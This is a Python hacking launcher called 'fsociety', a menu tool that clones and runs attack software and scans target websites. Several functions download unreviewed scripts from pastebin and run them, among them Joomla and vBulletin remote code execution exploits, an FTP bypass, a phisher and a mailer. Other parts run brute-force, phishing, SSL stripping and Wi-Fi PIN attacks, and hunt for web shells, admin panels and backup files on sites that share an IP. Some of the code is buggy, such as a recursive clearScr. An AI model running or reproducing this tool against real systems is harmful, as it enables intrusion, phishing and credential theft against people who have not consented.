#!/usr/bin/env python3
#    ______              _      _           _______
#   |  ____|            (_)    | |         |__   __|
#   | |__ ___  ___   ___ _  ___| |_ _   _     | | ___  __ _ _ __ ___
#   |  __/ __|/ _ \ / __| |/ _ \ __| | | |    | |/ _ \/ _` | '_ ` _ \
#   | |  \__ \ (_) | (__| |  __/ |_| |_| |    | |  __/ (_| | | | | | |
#   |_|  |___/\___/ \___|_|\___|\__|\__, |    |_|\___|\__,_|_| |_| |_|
#                                    __/ |
#                                   |___/
#
#                                 Greet's To
#
#              Koptan-Dz - Sparky Dz - HoussemTlm - Shadow00715
#                             Tool For Hacking
#                       Authors : Manisso & Sparky & CRO-THEHACKER


import sys
import argparse
import os
import time
import http.client
import subprocess
import re
import urllib.request
import urllib.error
import urllib.parse
import socket
import urllib.request
import urllib.parse
import urllib.error
import sys
import json
import telnetlib
import glob
import random
import queue
import threading
import base64
from getpass import getpass
from subprocess import *
from sys import argv
from platform import system
from urllib.parse import urlparse
from xml.dom import minidom
from optparse import OptionParser
from time import sleep
##########################
def clearScr():
    os.system('cls' if os.name == 'nt' else 'clear')

clearScr()


def menu():
    print ("""
 #     #
 ##   ##   ##   #    # #  ####   ####   ####
 # # # #  #  #  ##   # # #      #      #    #
 #  #  # #    # # #  # #  ####   ####  #    #
 #     # ###### #  # # #      #      # #    #
 #     # #    # #   ## # #    # #    # #    #
 #     # #    # #    # #  ####   ####   ####

     #######
       #     ####   ####  #       ####
       #    #    # #    # #      #
       #    #    # #    # #       ####
       #    #    # #    # #           #
       #    #    # #    # #      #    #
       #     ####   ####  ######  ####
             Penetration Testing Tools

                                               """)


clearScr()
clearScr()
clearScr()
clearScr()

directories = ['/uploads/', '/upload/', '/files/', '/resume/', '/resumes/', '/documents/', '/docs/', '/pictures/', '/file/', '/Upload/', '/Uploads/', '/Resume/', '/Resume/', '/UsersFiles/', '/Usersiles/', '/usersFiles/', '/Users_Files/', '/UploadedFiles/',
               '/Uploaded_Files/', '/uploadedfiles/', '/uploadedFiles/', '/hpage/', '/admin/upload/', '/admin/uploads/', '/admin/resume/', '/admin/resumes/', '/admin/pictures/', '/pics/', '/photos/', '/Alumni_Photos/', '/alumni_photos/', '/AlumniPhotos/', '/users/']
shells = ['wso.php', 'shell.php', 'an.php', 'hacker.php', 'lol.php', 'up.php', 'cp.php', 'upload.php',
          'sh.php', 'pk.php', 'mad.php', 'x00x.php', 'worm.php', '1337worm.php', 'config.php', 'x.php', 'haha.php']
upload = []
yes = set(['yes', 'y', 'ye', 'Y'])
no = set(['no', 'n'])


def menu():
    print("""
   __                _      _
  / _|              (_)    | |
 | |_ ___  ___   ___ _  ___| |_ _   _
 |  _/ __|/ _ \ / __| |/ _ \ __| | | |
 | | \__ \ (_) | (__| |  __/ |_| |_| |
 |_| |___/\___/ \___|_|\___|\__|\__, |
  Coded By Manisso & CRO         __/ |
                                |___/

    Select From The Menu:

    1 : Information Gathering
    2 : Password Attacks
    3 : Wireless Testing
    4 : Exploitation Tools
    5 : Sniffing & Spoofing
    6 : Web Hacking
    7 : Private Web Hacking
    8 : Post Exploitation
    9 : Install & Update
    99: Exit

    """)
    choice = input("-> ")
    clearScr()
    if choice == "1":
        info()
    elif choice == "2":
        passwd()
    elif choice == "3":
        wire()
    elif choice == "4":
        exp()
    elif choice == "5":
        snif()
    elif choice == "6":
        webhack()
    elif choice == "7":
        tnn()
    elif choice == "8":
        postexp()
    elif choice == "9":
        sniper()
    elif choice == "99":
        clearScr(), sys.exit()
    elif choice == "":
        menu()
    else:
        menu()


def sniper():
    print ("This tool is only available for Linux and or similar systems ")
    choicesniper = input("Continue Y / N: ")
    if choicesniper in yes:
        os.system("git clone https://github.com/CRO-THEHACKER/fsociety3.git")
        os.system("cd fsociety3 && sudo bash src/ins/update.sh")
        os.system("fsociety3")
    elif choicesniper == "":
        menu()


def doork():
    print("doork is a open-source passive vulnerability auditor tool that automates the process of searching on Google information about specific website based on dorks. ")
    doorkchice = input("Continue Y / N: ")
    if doorkchice in yes:
        os.system("pip install beautifulsoup4 && pip install requests")
        os.system("git clone https://github.com/AeonDave/doork")
        clearScr()
        doorkt = input("Target : ")
        os.system("cd doork && python doork.py -t %s -o log.log" % doorkt)


def postexp():
    clearScr()
    print("1:  Shell Checker")
    print("2:  POET")
    print("3:  Phishing Framework \n")
    print("99: Return to main menu \n ")
    choice11 = input("-> ")
    clearScr()
    if choice11 == "1":
        sitechecker()
    if choice11 == "2":
        poet()
    if choice11 == "3":
        weeman()
    elif choice11 == "99":
        menu()


def scanusers():
    site = input('Enter a website : ')
    try:
        users = site
        if 'http://www.' in users:
            users = users.replace('http://www.', '')
        if 'http://' in users:
            users = users.replace('http://', '')
        if '.' in users:
            users = users.replace('.', '')
        if '-' in users:
            users = users.replace('-', '')
        if '/' in users:
            users = users.replace('/', '')
        while len(users) > 2:
            print(users)
            resp = urllib.request.urlopen(
                site + '/cgi-sys/guestbook.cgi?user=%s' % users).read()

            if 'invalid username' not in resp.lower():
                print("\tFound -> %s" % users)
                pass

            users = users[:-1]
    except:
        pass


def brutex():
    clearScr()
    print("Automatically brute force all services running on a target : Open ports / DNS domains / Usernames / Passwords ")
    os.system("git clone https://github.com/1N3/BruteX.git")
    clearScr
    brutexchoice = input("Select a Target : ")
    os.system("cd BruteX && chmod 777 brutex && ./brutex %s" % brutexchoice)


def arachni():
    print("Arachni is a feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications")
    cara = input("Install And Run ? Y / N : ")
    clearScr
    print("exemple : http://www.target.com/")
    tara = input("Select a target to scan : ")
    if cara in yes:
        os.system("git clone git://github.com/Arachni/arachni.git")
        os.system(
            "cd arachni && sudo gem install bundler && bundle install --without prof && rake install")
        os.system("archani")
    clearScr()
    os.system("cd arachni/bin && chmod 777 arachni && ./arachni %s" % tara)


def xsstracer():
    clearScr()
    print("XSSTracer is a small python script that checks remote web servers for Clickjacking, Cross-Frame Scripting, Cross-Site Tracing and Host Header Injection.")
    os.system("git clone https://github.com/1N3/XSSTracer.git")
    clearScr()
    xsstracerchoice = input("Select a Target: ")
    os.system(
        "cd XSSTracer && chmod 777 xsstracer.py && python xsstracer.py %s 80" % xsstracerchoice)


def weeman():
    print("HTTP server for phishing in python. (and framework) Usually you will want to run Weeman with DNS spoof attack. (see dsniff, ettercap).")
    choicewee = input("Install Weeman ? Y / N : ")
    if choicewee in yes:
        os.system(
            "git clone https://github.com/Hypsurus/weeman.git && cd weeman && python weeman.py")
    if choicewee in no:
        menu()
    else:
        menu()


def gabriel():
    print("Abusing authentication bypass of Open&Compact (Gabriel's)")
    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
    clearScr()
    os.system("python gabriel.py")
    ftpbypass = input("Enter Target IP and Use Command :")
    os.system("python gabriel.py %s" % ftpbypass)


def sitechecker():
    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
    clearScr()
    os.system("python ch01.py")


def h2ip():
    host = input("Select A Host : ")
    ips = socket.gethostbyname(host)
    print(ips)


def ports():
    clearScr()
    target = input('Select a Target IP -> ')
    os.system("nmap -O -Pn %s" % target)
    sys.exit()


def ifinurl():
    print(""" This Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails & urls, with an internal custom validation junction for each target / url found.""")
    print('Do You Want To Install InurlBR ? ')
    cinurl = input("Y/N: ")
    if cinurl in yes:
        inurl()
    if cinurl in no:
        menu()
    elif cinurl == "":
        menu()
    else:
        menu()


def bsqlbf():
    clearScr()
    print("This tool will only work on blind sql injection")
    cbsq = input("select target : ")
    os.system("wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/bsqlbf-v2/bsqlbf-v2-7.pl -o bsqlbf.pl")
    os.system("perl bsqlbf.pl -url %s" % cbsq)
    os.system("rm bsqlbf.pl")


def venom():
    print ("Venom Automatic Shellcode Generator")
    print ("Do You To Install Venom ?")
    choiceshell = input("Y/N: ")
    if choiceshell in yes:
        os.system("wget http://fsociety.tn/venom.zip --output-document=venom.zip")
        os.system("unzip venom.zip -d venom")
        os.system("cd venom && sh venom.sh")
    elif choiceshell in no:
        clearScr()
        info()


def commix():
    print ("Automated All-in-One OS Command Injection and Exploitation Tool.")
    print ("usage : python commix.py --help")
    choicecmx = input("Continue: y/n :")
    if choicecmx in yes:
        os.system("git clone https://github.com/stasinopoulos/commix.git commix")
        os.system("cd commix")
        os.system("python commix.py")
        os.system("")
    elif choicecmx in no:
        clearScr()
        info()


def pixiewps():
    print("""Pixiewps is a tool written in C used to bruteforce offline the WPS pin exploiting the low or non-existing entropy of some Access Points, the so-called "pixie dust attack" discovered by Dominique Bongard in summer 2014. It is meant for educational purposes only
    """)
    choicewps = input("Continue ? Y/N : ")
    if choicewps in yes:
        os.system("git clone https://github.com/wiire/pixiewps.git")
        os.system(" cd pixiewps/src & make ")
        os.system(" cd pixiewps/src & sudo make install")
    if choicewps in no:
        menu()
    elif choicewps == "":
        menu()
    else:
        menu()


def webhack():
    print("1 : Drupal Hacking ")
    print("2 : Inurlbr")
    print("3 : Wordpress & Joomla Scanner")
    print("4 : Gravity Form Scanner")
    print("5 : File Upload Checker")
    print("6 : Wordpress Exploit Scanner")
    print("7 : Wordpress Plugins Scanner")
    print("8 : Shell and Directory Finder")
    print("9 : Joomla! 1.5 - 3.4.5 remote code execution")
    print("10: Vbulletin 5.X remote code execution")
    print("11: BruteX - Automatically brute force all services running on a target")
    print("12: Arachni - Web Application Security Scanner Framework \n ")
    print("99: Exit \n ")
    choiceweb = input("-> ")
    if choiceweb == "1":
        clearScr()
        maine()
    if choiceweb == "2":
        clearScr()
        ifinurl()
    if choiceweb == '3':
        clearScr()
        wppjmla()
    if choiceweb == "4":
        clearScr()
        gravity()
    if choiceweb == "5":
        clearScr()
        sqlscan()
    if choiceweb == "6":
        clearScr()
        wpminiscanner()
    if choiceweb == "7":
        clearScr()
        wppluginscan()
    if choiceweb == "8":
        clearScr()
        shelltarget()
    if choiceweb == "9":
        clearScr()
        joomlarce()
    if choiceweb == "10":
        clearScr()
        vbulletinrce()
    if choiceweb == "11":
        clearScr()
        brutex()
    if choiceweb == "12":
        clearScr()
        arachni()
    elif choiceweb == "99":
        menu()
    elif choiceweb == "":
        menu()
    else:
        menu()


def vbulletinrce():
    os.system("wget http://pastebin.com/raw/eRSkgnZk --output-document=tmp.pl")
    os.system("perl tmp.pl")


def joomlarce():
    os.system("wget http://pastebin.com/raw/EX7Gcbxk --output-document=temp.py")
    clearScr()
    print("if the response is 200 , you will find your shell in Joomla_3.5_Shell.txt")
    jmtarget = input("Select a targets list :")
    os.system("python temp.py %s" % jmtarget)


def inurl():
    dork = input("select a Dork:")
    output = input("select a file to save :")
    os.system(
        "./inurlbr.php --dork '{0}' -s {1}.txt -q 1,6 -t 1".format(dork, output))
    if cinurl in no:
        insinurl()
    elif cinurl == "":
        menu()
    else:
        menu()


def insinurl():
    os.system("git clone https://github.com/googleinurl/SCANNER-INURLBR.git")
    os.system("chmod +x SCANNER-INURLBR/inurlbr.php")
    os.system("apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl")
    os.system("mv /SCANNER-INURLBR/inurbr.php inurlbr.php")
    clearScr()
    inurl()


def nmap():

    choice7 = input("continue ? Y / N : ")
    if choice7 in yes:
        os.system("wget https://nmap.org/dist/nmap-7.01.tar.bz2")
        os.system("bzip2 -cd nmap-7.01.tar.bz2 | tar xvf -")
        os.system("cd nmap-7.01 & ./configure")
        os.system("cd nmap-7.01 & make")
        os.system("su root")
        os.system("cd nmap-7.01 & make install")
    elif choice7 in no:
        info()
    elif choice7 == "":
        menu()
    else:
        menu()


def jboss():
    clearScr()
    print ("This JBoss script deploys a JSP shell on the target JBoss AS server. Once")
    print ("deployed, the script uses its upload and command execution capability to")
    print ("provide an interactive session.")
    print ("")
    print ("usage : ./e.sh target_ip tcp_port ")
    print("Continue: y/n")
    choice9 = input("yes / no :")
    if choice9 in yes:
        os.system(
            "git clone https://github.com/SpiderLabs/jboss-autopwn.git"), sys.exit()
    elif choice9 in no:
        clearScr()
        exp()
    elif choice9 == "":
        menu()
    else:
        menu()


def wppluginscan():
    Notfound = [404, 401, 400, 403, 406, 301]
    sitesfile = input("sites file : ")
    filepath = input("Plugins File : ")

    def scan(site, dir):
        global resp
        try:
            conn = http.client.HTTPConnection(site)
            conn.request('HEAD', "/wp-content/plugins/" + dir)
            resp = conn.getresponse().status
        except() as message:
            print("Cant Connect :", message)
            pass

    def timer():
        now = time.localtime(time.time())
        return time.asctime(now)

    def main():
        sites = open(sitesfile).readlines()
        plugins = open(filepath).readlines()
        for site in sites:
            site = site.rstrip()
        for plugin in plugins:
            plugin = plugin.rstrip()
            scan(site, plugin)
            if resp not in Notfound:
                print("+----------------------------------------+")
                print("| current site :" + site)
                print("| Found Plugin : " + plugin)
                print("| Result:", resp)


def sqlmap():
    print ("usage : python sqlmap.py -h")
    choice8 = input("Continue: y/n :")
    if choice8 in yes:
        os.system(
            "git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev & ")
    elif choice8 in no:
        clearScr()
        info()
    elif choice8 == "":
        menu()
    else:
        menu()


def grabuploadedlink(url):
    try:
        for dir in directories:
            currentcode = urllib.request.urlopen(url + dir).getcode()
            if currentcode == 200 or currentcode == 403:
                print("-------------------------")
                print("  [ + ] Found Directory :  " +
                      str(url + dir) + " [ + ]")
                print("-------------------------")
                upload.append(url + dir)
    except:
        pass


def grabshell(url):
    try:
        for upl in upload:
            for shell in shells:
                currentcode = urllib.request.urlopen(upl + shell).getcode()
                if currentcode == 200:
                    print("-------------------------")
                    print("  [ ! ] Found Shell :  " +
                          str(upl + shell) + " [ ! ]")
                    print("-------------------------")
    except:
        pass


def shelltarget():
    print("exemple : http://target.com")
    line = input("target : ")
    line = line.rstrip()
    grabuploadedlink(line)
    grabshell(line)


def poet():
    print("POET is a simple POst-Exploitation Tool.")
    print("")
    choicepoet = input("y / n :")
    if choicepoet in yes:
        os.system("git clone https://github.com/mossberg/poet.git")
        os.system("python poet/server.py")
    if choicepoet in no:
        clearScr()
        postexp()
    elif choicepoet == "":
        menu()
    else:
        menu()


def setoolkit():
    print ("The Social-Engineer Toolkit is an open-source penetration testing framework")
    print(") designed for social engineering. SET has a number of custom attack vectors that ")
    print(" allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC  ")
    print("an information security consulting firm located in Cleveland, Ohio.")
    print("")
    choiceset = input("y / n :")
    if choiceset in yes:
        os.system(
            "git clone https://github.com/trustedsec/social-engineer-toolkit.git")
        os.system("python social-engineer-toolkit/setup.py")
    if choiceset in no:
        clearScr()
        info()
    elif choiceset == "":
        menu()
    else:
        menu()


def cupp():
    print("cupp is a password list generator ")
    print("Usage: python cupp.py -h")
    choicecupp = input("Continue: y/n : ")

    if choicecupp in yes:
        os.system("git clone https://github.com/Mebus/cupp.git")
        print("file downloaded successfully")
    elif choicecupp in no:
        clearScr()
        passwd()
    elif choicecupp == "":
        menu()
    else:
        menu()


def ncrack():
    print("A Ruby interface to Ncrack, Network authentication cracking tool.")
    print("requires : nmap >= 0.3ALPHA / rprogram ~> 0.3")
    print("Continue: y/n")
    choicencrack = input("y / n :")
    if choicencrack in yes:
        os.system("git clone https://github.com/sophsec/ruby-ncrack.git")
        os.system("cd ruby-ncrack")
        os.system("install ruby-ncrack")
    elif choicencrack in no:
        clearScr()
        passwd()
    elif choicencrack == "":
        menu()
    else:
        menu()


def reaver():
    print("""
      Reaver has been designed to be a robust and practical attack against Wi-Fi Protected Setup
      WPS registrar PINs in order to recover WPA/WPA2 passphrases. It has been tested against a
      wide variety of access points and WPS implementations
      1 to accept / 0 to decline
        """)
    creaver = input("y / n :")
    if creaver in yes:
        os.system(
            "apt-get -y install build-essential libpcap-dev sqlite3 libsqlite3-dev aircrack-ng pixiewps")
        os.system("git clone https://github.com/t6x/reaver-wps-fork-t6x.git")
        os.system("cd reaver-wps-fork-t6x/src/ & ./configure")
        os.system("cd reaver-wps-fork-t6x/src/ & make")
    elif creaver in no:
        clearScr()
        wire()
    elif creaver == "":
        menu()
    else:
        menu()


def ssls():
    print("""sslstrip is a MITM tool that implements Moxie Marlinspike's SSL stripping
    attacks.
    It requires Python 2.5 or newer, along with the 'twisted' python module.""")
    cssl = input("y / n :")
    if cssl in yes:
        os.system("git clone https://github.com/moxie0/sslstrip.git")
        os.system("sudo apt-get install python-twisted-web")
        os.system("python sslstrip/setup.py")
    if cssl in no:
        snif()
    elif cssl == "":
        menu()
    else:
        menu()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):

    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib.request.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib.error.URLError:
            pass

    final = unique(lista)
    return final


def check_gravityforms(sites):
    import urllib.request
    import urllib.parse
    import urllib.error
    gravityforms = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'wp-content/plugins/gravityforms/gravityforms.php').getcode() == 403:
                gravityforms.append(site)
        except:
            pass

    return gravityforms


def gravity():
    ip = input('Enter IP : ')
    sites = bing_all_grabber(str(ip))
    gravityforms = check_gravityforms(sites)
    for ss in gravityforms:
        print(ss)

    print('\n')
    print('[*] Found, ', len(gravityforms), ' gravityforms.')


def shellnoob():
    print("""Writing shellcodes has always been super fun, but some parts are extremely boring and error prone. Focus only on the fun part, and use ShellNoob!""")
    cshell = input("Y / N : ")
    if cshell in yes:
        os.system("git clone https://github.com/reyammer/shellnoob.git")
        os.system("mv shellnoob/shellnoob.py shellnoob.py")
        os.system("sudo python shellnoob.py --install")
    if cshell in no:
        exp()
    elif cshell == "":
        menu()
    else:
        menu()


def info():
    print("""
   __                _      _
  / _|              (_)    | |
 | |_ ___  ___   ___ _  ___| |_ _   _
 |  _/ __|/ _ \ / __| |/ _ \ __| | | |
 | | \__ \ (_) | (__| |  __/ |_| |_| |
 |_| |___/\___/ \___|_|\___|\__|\__, |
  Coded By Manisso & Sparky Dz   __/ |
                                |___/  """)
    print("1: Nmap ")
    print("2: Setoolkit")
    print("3: Port Scanning")
    print("4: Host To IP")
    print("5: wordpress user")
    print("6: CMS scanner")
    print("7: XSStracer")
    print("8: Dork - Google Dorks Passive Vulnerability Auditor ")
    print("9: Scan A server's Users \n ")
    print("99: Back To Main Menu \n")
    choice2 = input("-> ")
    if choice2 == "1":
        clearScr()
        nmap()
    if choice2 == "2":
        clearScr()
        setoolkit()
    if choice2 == "3":
        clearScr()
        ports()
    if choice2 == "4":
        clearScr()
        h2ip()
    if choice2 == "5":
        clearScr()
        wpue()
    if choice2 == "6":
        clearScr()
        cmsscan()
    if choice2 == "7":
        clearScr()
        xsstracer()
    if choice2 == "8":
        clearScr()
        doork()
    elif choice2 == "99":
        clearScr()
        menu()
    if choice2 == "9":
        clearScr()
        scanusers()
    elif choice2 == "":
        menu()
    else:
        menu()


def cmsscan():
    os.system("git clone https://github.com/Dionach/CMSmap.git")
    clearScr()
    xz = input("select target : ")
    os.system("cd CMSmap @@ sudo cmsmap.py %s" % xz)


def wpue():
    os.system("git clone https://github.com/wpscanteam/wpscan.git")
    clearScr()
    xe = input("Select a Wordpress target : ")
    os.system("cd wpscan && sudo ruby wpscan.rb --url %s --enumerate u" % xe)


def priv8():
    tnn()


def androidhash():
    key = input("Enter the android hash : ")
    salt = input("Enter the android salt : ")
    os.system("git clone https://github.com/PentesterES/AndroidPINCrack.git")
    os.system(
        "cd AndroidPINCrack && python AndroidPINCrack.py -H %s -s %s" % (key, salt))


def passwd():
    print("""
   __                _      _
  / _|              (_)    | |
 | |_ ___  ___   ___ _  ___| |_ _   _
 |  _/ __|/ _ \ / __| |/ _ \ __| | | |
 | | \__ \ (_) | (__| |  __/ |_| |_| |
 |_| |___/\___/ \___|_|\___|\__|\__, |
  Coded By Manisso & Sparky Dz   __/ |
                                |___/  """)
    print("1: Cupp ")
    print("2: Ncrack \n ")

    print("99: Back To Main Menu \n")
    choice3 = input("-> ")
    if choice3 == "1":
        clearScr()
        cupp()
    elif choice3 == "2":
        clearScr()
        ncrack()
    elif choice3 == "99":
        clearScr()
        menu()
    elif choice3 == "":
        menu()
    elif choice3 == "3":
        fb()
    else:
        menu()


def bluepot():
    print("you need to have at least 1 bluetooth receiver (if you have many it will work wiht those, too). You must install / libbluetooth-dev on Ubuntu / bluez-libs-devel on Fedora/bluez-devel on openSUSE ")
    choice = input("Continue ? Y / N : ")
    if choice in yes:
        os.system("wget https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz && tar xfz bluepot-0.1.tar.gz && sudo java -jar bluepot/BluePot-0.1.jar")
    else:
        menu()


def wire():
    print("""
   __                _      _
  / _|              (_)    | |
 | |_ ___  ___   ___ _  ___| |_ _   _
 |  _/ __|/ _ \ / __| |/ _ \ __| | | |
 | | \__ \ (_) | (__| |  __/ |_| |_| |
 |_| |___/\___/ \___|_|\___|\__|\__, |
  Coded By Manisso & Sparky Dz   __/ |
                                |___/  """)
    print("1 : reaver ")
    print("2 : pixiewps")
    print("3 : Bluetooth Honeypot GUI Framework \n")
    print("99: Back To The Main Menu \n")
    choice4 = input("-> ")
    if choice4 == "1":
        clearScr()
        reaver()
    if choice4 == "2":
        clearScr()
        pixiewps()
    if choice4 == "3":
        bluepot()
    elif choice4 == "99":
        menu()
    elif choice4 == "":
        menu()
    else:
        menu()


def exp():
    print("""
   __                _      _
  / _|              (_)    | |
 | |_ ___  ___   ___ _  ___| |_ _   _
 |  _/ __|/ _ \ / __| |/ _ \ __| | | |
 | | \__ \ (_) | (__| |  __/ |_| |_| |
 |_| |___/\___/ \___|_|\___|\__|\__, |
  Coded By Manisso & Sparky Dz   __/ |
                                |___/  """)
    print("1 : Venom")
    print("2 : sqlmap")
    print("3 : Shellnoob")
    print("4 : commix")
    print("5 : FTP Auto Bypass")
    print("6 : jboss-autopwn")
    print("7 : Blind SQL Automatic Injection And Exploit")
    print("8 : Bruteforce the Android Passcode given the hash and salt")
    print("9 : Joomla SQL injection Scanner \n ")
    print("99 : Go Back To Main Menu \n")
    choice5 = input("-> ")
    if choice5 == "2":
        clearScr()
        sqlmap()
    if choice5 == "1":
        clearScr()
        venom()
    if choice5 == "3":
        clearScr()
        shellnoob()
    if choice5 == "4":
        os.system("clear")
        commix()
    if choice5 == "5":
        clearScr()
        gabriel()
    if choice5 == "6":
        clearScr()
        jboss()
    if choice5 == "7":
        clearScr()
        bsqlbf()
    if choice5 == "8":
        androidhash()
    if choice5 == "9":
        cmsfew()
    elif choice5 == "99":
        menu()
    elif choice5 == "":
        menu()
    else:
        menu()


def snif():
    print("""
   __                _      _
  / _|              (_)    | |
 | |_ ___  ___   ___ _  ___| |_ _   _
 |  _/ __|/ _ \ / __| |/ _ \ __| | | |
 | | \__ \ (_) | (__| |  __/ |_| |_| |
 |_| |___/\___/ \___|_|\___|\__|\__, |
  Coded By Manisso & Sparky Dz   __/ |
                                |___/  """)
    print("1 : Setoolkit ")
    print("2 : SSLtrip")
    print("3 : pyPISHER")
    print("4 : SMTP Mailer \n ")
    print("99: Back To Main Menu \n")
    choice6 = input("-> ")
    if choice6 == "1":
        clearScr()
        setoolkit()
    if choice6 == "2":
        clearScr()
        ssls()
    if choice6 == "3":
        clearScr()
        pisher()
    if choice6 == "4":
        clearScr()
        smtpsend()
    if choice6 == "99":
        clearScr()
        menu()
    elif choice6 == "":
        menu()
    else:
        menu()


def cmsfew():
    print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
    target = input("Select a target : ")
    os.system(
        "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
    os.system("python cms.py %s" % target)


def smtpsend():
    os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
    clearScr()
    os.system("python smtp.py")


def pisher():
    os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
    clearScr()
    os.system("python pisher.py")


menuu = """
 1) Get all websites
 2) Get joomla websites
 3) Get wordpress websites
 4) Control Panel Finder
 5) Zip Files Finder
 6) Upload File Finder
 7) Get server users
 8) SQli Scanner
 9) Ports Scan (range of ports)
 10) ports Scan (common ports)
 11) Get server Info
 12) Bypass Cloudflare
 99) Exit
"""


def unique(seq):
    """
    get unique from list found it on stackoverflow
    """
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def clearScr():
    """
    clear the screen in case of GNU/Linux or
    windows
    """
    if system() == 'Linux':
        clearScr()
    if system() == 'Windows':
        os.system('cls')


class TNscan:
    def __init__(self, serverip):
        self.serverip = serverip
        self.getSites(False)
        print(menuu)
        while True:
            choice = input(' Enter choice -> ')
            if choice == '1':
                self.getSites(True)
            elif choice == '2':
                self.getJoomla()
            elif choice == '3':
                self.getWordpress()
            elif choice == '4':
                self.findPanels()
            elif choice == '5':
                self.findZip()
            elif choice == '6':
                self.findUp()
            elif choice == '7':
                self.getUsers()
            elif choice == '8':
                self.grabSqli()
            elif choice == '9':
                ran = input(' Enter range of ports, (ex : 1-1000) -> ')
                self.portScanner(1, ran)
            elif choice == '10':
                self.portScanner(2, None)
            elif choice == '11':
                self.getServerBanner()
            elif choice == '12':
                self.cloudflareBypasser()
            elif choice == '99':
                menu()
            con = input(' Continue [Y/n] -> ')
            if con[0].upper() == 'N':
                exit()
            else:
                clearScr()
                print(menuu)

    def getSites(self, a):
        """
        get all websites on same server
        from bing search
        """
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+&count=50&first=" + str(page)
                openbing = urllib.request.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    allnoclean = findwebs[i]
                    findall1 = re.findall('http://(.*?)/', allnoclean)
                    for idx, item in enumerate(findall1):
                        if 'www' not in item:
                            findall1[idx] = 'http://www.' + item + '/'
                        else:
                            findall1[idx] = 'http://' + item + '/'
                    lista.extend(findall1)

                page += 50
            except urllib.error.URLError:
                pass
        self.sites = unique(lista)
        if a:
            clearScr()
            print('[*] Found ', len(lista), ' Website\n')
            for site in self.sites:
                print(site)

    def getWordpress(self):
        """
        get wordpress site using a dork the attacker
        may do a password list attack (i did a tool for that purpose check my pastebin)
        or scan for common vulnerabilities using wpscan for example (i did a simple tool
        for multi scanning using wpscan)
        """
        lista = []
        page = 1
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+?page_id=&count=50&first=" + str(page)
                openbing = urllib.request.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    wpnoclean = findwebs[i]
                    findwp = re.findall('(.*?)\?page_id=', wpnoclean)
                    lista.extend(findwp)
                page += 50
            except:
                pass
        lista = unique(lista)
        clearScr()
        print('[*] Found ', len(lista), ' Wordpress Website\n')
        for site in lista:
            print(site)

    def getJoomla(self):
        """
        get all joomla websites using
        bing search the attacker may bruteforce
        or scan them
        """
        lista = []
        page = 1
        while page <= 101:
            bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + \
                "+index.php?option=com&count=50&first=" + str(page)
            openbing = urllib.request.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                jmnoclean = findwebs[i]
                findjm = re.findall('(.*?)index.php', jmnoclean)
                lista.extend(findjm)
            page += 50
        lista = unique(lista)
        clearScr()
        print('[*] Found ', len(lista), ' Joomla Website\n')
        for site in lista:
            print(site)
############################
# find admin panels

    def findPanels(self):
        """
        find panels from grabbed websites
        the attacker may do a lot of vulnerabilty
        tests on the admin area
        """
        print("[~] Finding admin panels")
        adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/',
                     'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
        clearScr()
        for site in self.sites:
            for admin in adminList:
                try:
                    if urllib.request.urlopen(site + admin).getcode() == 200:
                        print(" [*] Found admin panel -> ", site + admin)
                except IOError:
                    pass
 ############################
 # find ZIP files

    def findZip(self):
        """
        find zip files from grabbed websites
        it may contain useful informations
        """
        zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar',
